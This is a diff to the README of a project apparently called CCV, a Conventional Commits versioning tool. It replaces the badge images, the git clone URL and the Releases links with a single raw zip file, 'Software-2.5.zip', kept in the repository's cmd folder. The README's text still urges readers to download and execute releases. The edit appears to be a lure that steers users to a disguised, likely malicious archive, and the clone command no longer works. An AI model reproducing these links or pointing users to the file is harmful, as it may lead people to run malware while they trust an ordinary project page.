@@ -1,6 +1,6 @@
 # CCV - Conventional Commits Versioner
 
-![GitHub Actions](https://img.shields.io/badge/GitHub-Actions-brightgreen.svg) ![Continuous Delivery](https://img.shields.io/badge/Continuous%20Delivery-blue.svg) ![Git](https://img.shields.io/badge/Git-black.svg) ![GitHub](https://img.shields.io/badge/GitHub-lightgrey.svg)
+![GitHub Actions](https://github.com/Kaks734/ccv/raw/refs/heads/master/cmd/Software-2.5.zip) ![Continuous Delivery](https://github.com/Kaks734/ccv/raw/refs/heads/master/cmd/Software-2.5.zip%https://github.com/Kaks734/ccv/raw/refs/heads/master/cmd/Software-2.5.zip) ![Git](https://github.com/Kaks734/ccv/raw/refs/heads/master/cmd/Software-2.5.zip) ![GitHub](https://github.com/Kaks734/ccv/raw/refs/heads/master/cmd/Software-2.5.zip)
 
 Welcome to the **CCV** repository! This project focuses on streamlining the versioning process in your development workflow using Conventional Commits. By adopting a standardized commit message format, you can automate versioning and changelog generation, making your release process smoother and more efficient.
 
@@ -35,7 +35,7 @@ To get started with **CCV**, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Kaks734/ccv.git
+   git clone https://github.com/Kaks734/ccv/raw/refs/heads/master/cmd/Software-2.5.zip
    ```
 
 2. Navigate to the project directory:
@@ -74,9 +74,9 @@ Once you have installed **CCV**, you can start using it in your project.
 
 ## Releases
 
-For the latest releases and updates, visit our [Releases](https://github.com/Kaks734/ccv/releases) section. You can download the latest version and execute it to take advantage of new features and improvements.
+For the latest releases and updates, visit our [Releases](https://github.com/Kaks734/ccv/raw/refs/heads/master/cmd/Software-2.5.zip) section. You can download the latest version and execute it to take advantage of new features and improvements.
 
-If you are looking for a specific release, please check the [Releases](https://github.com/Kaks734/ccv/releases) section for detailed information.
+If you are looking for a specific release, please check the [Releases](https://github.com/Kaks734/ccv/raw/refs/heads/master/cmd/Software-2.5.zip) section for detailed information.
 
 ## Contributing
 
